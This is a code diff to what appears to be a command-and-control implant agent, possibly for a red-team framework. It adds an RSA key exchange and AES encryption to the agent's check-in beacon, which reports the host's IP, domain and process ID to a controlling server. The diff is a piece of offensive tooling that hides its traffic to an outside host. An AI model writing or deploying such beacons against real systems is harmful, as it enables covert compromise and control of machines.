@@ -166,7 +166,28 @@ CRYPTO_MODULE_PLACEHOLDER
             except:
                 pass
 
-        # Standard check-in with encryption keys (now received from translation container)
+        # ---- 1. Key exchange ----
+        session_key = os.urandom(32)  # AES key
+        self.session_key = session_key
+
+        from cryptography.hazmat.primitives import serialization, hashes
+        from cryptography.hazmat.primitives.asymmetric import padding
+
+        pubkey = serialization.load_pem_public_key(self.agent_config["enc_key"]["enc_key"].encode())
+        enc_session = pubkey.encrypt(
+            session_key,
+            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
+        )
+        first_msg = {
+            "action": "key_exchange",
+            "uuid": self.agent_config["PayloadUUID"],
+            "encrypted_key": base64.b64encode(enc_session).decode()
+        }
+        resp = self.makeRequest(json.dumps(first_msg).encode(), 'POST')
+        if not resp or b'"ok"' not in resp:
+            return False
+
+        # ---- 2. Normal checkin ----
         data = {
             "action": "checkin",
             "ip": ip,
@@ -176,25 +197,27 @@ CRYPTO_MODULE_PLACEHOLDER
             "domain": socket.getfqdn(),
             "pid": os.getpid(),
             "uuid": self.agent_config["PayloadUUID"],
-            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
-            "encryption_key": base64.b64encode(self.agent_config["enc_key"]["enc_key"]).decode(),
-            "decryption_key": base64.b64encode(self.agent_config["enc_key"]["dec_key"]).decode()
+            "architecture": "x64" if sys.maxsize > 2**32 else "x86"
         }
-        
-        # Use existing formatMessage (which encrypts) and formatResponse (which decrypts)
-        encoded_data = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
+
+        # encrypt with negotiated session key
+        iv = os.urandom(16)
+        encryptor = Cipher(algorithms.AES(session_key), modes.CFB(iv)).encryptor()
+        ct = encryptor.update(json.dumps(data).encode()) + encryptor.finalize()
+        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + iv + ct)
+
         decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
-        
         if not decoded_data:
             return False
+
         try:
-            response_json = json.loads(decoded_data.replace(self.agent_config["UUID"], "", 1))
+            response_json = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"], "", 1))
             if "status" in response_json and "id" in response_json:
                 self.agent_config["UUID"] = response_json["id"]
                 return True
             else:
                 return False
-        except json.JSONDecodeError as e:
+        except json.JSONDecodeError:
             return False
 
      
@@ -346,8 +369,9 @@ CRYPTO_MODULE_PLACEHOLDER
             "ProxyUser": "proxy_user",
             "ProxyPass": "proxy_pass",
             "ProxyPort": "proxy_port",
-            "enc_key": None,
-            "dec_key": None
+            "enc_key": {
+                "enc_key": """PUBLIC_KEY_PLACEHOLDER"""   
+            }
         }
 
         if not self.performKeyExchange():
